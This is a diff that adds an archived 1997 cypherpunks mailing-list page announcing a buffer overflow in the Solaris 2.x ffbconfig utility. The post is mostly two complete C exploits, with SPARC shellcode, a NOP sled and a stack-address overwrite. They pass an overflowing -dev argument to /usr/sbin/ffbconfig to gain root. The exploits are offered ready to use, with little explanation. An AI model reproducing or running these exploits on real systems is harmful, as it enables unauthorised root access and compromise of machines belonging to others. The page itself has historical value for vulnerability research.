@@ -1,0 +1,224 @@
+<!-- MHonArc v2.4.3 -->
+<!--X-Subject: Security hole in Sloaris 2.X ffbconfig + exploit -->
+<!--X-From-R13: Qevfgvna EQVWBAD <fxvcbNfhaql.pf.cho.eb> -->
+<!--X-Date: Mon, 10 Feb 1997 09:30:06 &#45;0800 (PST) -->
+<!--X-Message-Id: Pine.GSO.3.95.970210192433.1304G&#45;100000@sundy.cs.pub.ro -->
+<!--X-Content-Type: text/plain -->
+<!--X-Head-End-->
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML//EN">
+<HTML>
+<HEAD>
+<TITLE>Security hole in Sloaris 2.X ffbconfig + exploit</TITLE>
+<LINK REV="made" HREF="mailto:skipo@sundy.cs.pub.ro">
+</HEAD>
+<BODY>
+<!--X-Body-Begin-->
+<!--X-User-Header-->
+<!--X-User-Header-End-->
+<!--X-TopPNI-->
+<HR>
+[<A HREF="msg01708.html">Date Prev</A>][<A HREF="msg01725.html">Date Next</A>][<A HREF="msg00680.html">Thread Prev</A>][<A HREF="msg00517.html">Thread Next</A>][<A HREF="index.html#01730">Date Index</A>][<A HREF="threads.html#01730">Thread Index</A>]
+<!--X-TopPNI-End-->
+<!--X-MsgBody-->
+<!--X-Subject-Header-Begin-->
+<H1>Security hole in Sloaris 2.X ffbconfig + exploit</H1>
+<HR>
+<!--X-Subject-Header-End-->
+<!--X-Head-of-Message-->
+<UL>
+<LI><em>To</em>: <A HREF="mailto:cypherpunks@toad.com">cypherpunks@toad.com</A></LI>
+<LI><em>Subject</em>: Security hole in Sloaris 2.X ffbconfig + exploit</LI>
+<LI><em>From</em>: Cristian SCHIPOR &lt;<A HREF="mailto:skipo@sundy.cs.pub.ro">skipo@sundy.cs.pub.ro</A>&gt;</LI>
+<LI><em>Date</em>: Mon, 10 Feb 1997 19:25:18 +0200 (EET)</LI>
+<LI><em>Sender</em>: <A HREF="mailto:owner%2Dcypherpunks@toad.com">owner-cypherpunks@toad.com</A></LI>
+</UL>
+<!--X-Head-of-Message-End-->
+<!--X-Head-Body-Sep-Begin-->
+<HR>
+<!--X-Head-Body-Sep-End-->
+<!--X-Body-of-Message-->
+<PRE>
+
+Mon Feb 10 15:58 EET 1997 Romania  
+
+"Buffer Overflow" rules.
+
+I have found a buffer overflow hole in ffbconfig (Solaris2.X). That allow  you
+to gain root access on your machine. I used an exploit written by Jeremy Elson
+for gethostbyname() buffer overflow hole (I modified some values to make this 
+work).   
+
+I dont now yet what in ffbconfig is wrong but Im still diging. So more 
+detailes later.
+
+Here's the exploit for Solaris 2.X:
+
+
+---------------------------------- first  ------------------------------------- 
+/*
+This works on Solaris 2.5 wiz /usr/sbin/ffbconfig
+*/
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LENGTH      128
+#define EXTRA           256
+#define STACK_OFFSET    128
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
+"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
+"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
+"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd4\xff\xff";
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),so;
+
+  long_p = (u_long *) buf;
+
+  for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i &lt; code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+
+  targ_addr = get_sp() - STACK_OFFSET;
+  for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+
+  execl("/usr/sbin/ffbconfig", "ffbconfig", "-dev", buf,(char *) 0);
+  perror("execl failed");
+}
+
+------------------------ end of "ffbcexp25.c"  --------------------------------
+
+-------------------------------- second --------------------------------------
+
+/*
+This works on Solaris 2.4 wiz /usr/sbin/ffbconfig from a Solaris 2.5
+*/
+
+
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+
+#define BUF_LENGTH      128
+#define EXTRA           256
+#define STACK_OFFSET    128
+#define SPARC_NOP       0xa61cc013
+
+u_char sparc_shellcode[] =
+"\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e\x2f\x0b\xda\xdc\xae\x15\xe3\x68"
+"\x90\x0b\x80\x0e\x92\x03\xa0\x0c\x94\x1a\x80\x0a\x9c\x03\xa0\x14"
+"\xec\x3b\xbf\xec\xc0\x23\xbf\xf4\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
+"\x82\x10\x20\x3b\x91\xd0\x20\x08\x90\x1b\xc0\x0f\x82\x10\x20\x01"
+"\x91\xd0\x20\x08"
+;
+
+
+u_long get_sp(void)
+{
+  __asm__("mov %sp,%i0 \n");
+}
+
+void main(int argc, char *argv[])
+{
+  char buf[BUF_LENGTH + EXTRA];
+  long targ_addr;
+  u_long *long_p;
+  u_char *char_p;
+  int i, code_length = strlen(sparc_shellcode),so;
+
+  long_p = (u_long *) buf;
+
+  for (i = 0; i &lt; (BUF_LENGTH - code_length) / sizeof(u_long); i++)
+    *long_p++ = SPARC_NOP;
+
+  char_p = (u_char *) long_p;
+
+  for (i = 0; i &lt; code_length; i++)
+    *char_p++ = sparc_shellcode[i];
+
+  long_p = (u_long *) char_p;
+  targ_addr = get_sp() - STACK_OFFSET;
+  for (i = 0; i &lt; EXTRA / sizeof(u_long); i++)
+    *long_p++ =targ_addr;
+
+  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
+targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);
+
+  execl("/usr/sbin/ffbconfig", "ffbconfig", "-dev", buf,(char *) 0);
+  perror("execl failed");
+}
+
+------------------------------ end of ffbcexp24.c -----------------------------
+
+Cristian Schipor - Computer Science Faculty  - Romania -  Bucharest 
+Email: skipo@math.pub.ro or skipo@ns.ima.ro
+Phone: (401) 410.60.88
+
+
+PS: "special for STFP"
+
+
+</PRE>
+
+<!--X-Body-of-Message-End-->
+<!--X-MsgBody-End-->
+<!--X-Follow-Ups-->
+<HR>
+<!--X-Follow-Ups-End-->
+<!--X-References-->
+<!--X-References-End-->
+<!--X-BotPNI-->
+<UL>
+<LI>Prev by Date:
+<STRONG><A HREF="msg01708.html">You guys/gals oughta get a kick outta this guy</A></STRONG>
+</LI>
+<LI>Next by Date:
+<STRONG><A HREF="msg01725.html">Re: New X-Ray Imager</A></STRONG>
+</LI>
+<LI>Prev by thread:
+<STRONG><A HREF="msg00680.html">Re: You guys/gals oughta get a kick outta this guy</A></STRONG>
+</LI>
+<LI>Next by thread:
+<STRONG><A HREF="msg00517.html">Security hole in Sloaris 2.X ffbconfig + exploit</A></STRONG>
+</LI>
+<LI>Index(es):
+<UL>
+<LI><A HREF="index.html#01730"><STRONG>Date</STRONG></A></LI>
+<LI><A HREF="threads.html#01730"><STRONG>Thread</STRONG></A></LI>
+</UL>
+</LI>
+</UL>
+
+<!--X-BotPNI-End-->
+<!--X-User-Footer-->
+<!--X-User-Footer-End-->
+</BODY>
+</HTML>
